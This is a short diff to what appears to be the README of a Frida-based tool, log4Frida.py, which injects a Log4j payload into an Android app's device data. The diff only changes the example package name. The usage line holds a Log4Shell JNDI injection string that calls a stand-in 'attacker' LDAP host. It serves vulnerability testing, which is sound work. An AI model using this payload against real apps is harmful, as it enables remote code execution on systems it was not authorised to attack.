@@ -30,5 +30,5 @@ Modifies all device characteristicts in order to return a Log4j payload instead:
 
 Usage:
 
-```$python3 log4Frida.py com.booking  '${jndi:ldap://attacker/a}' ```
+```$python3 log4Frida.py com.foo.bar  '${jndi:ldap://attacker/a}' ```
 
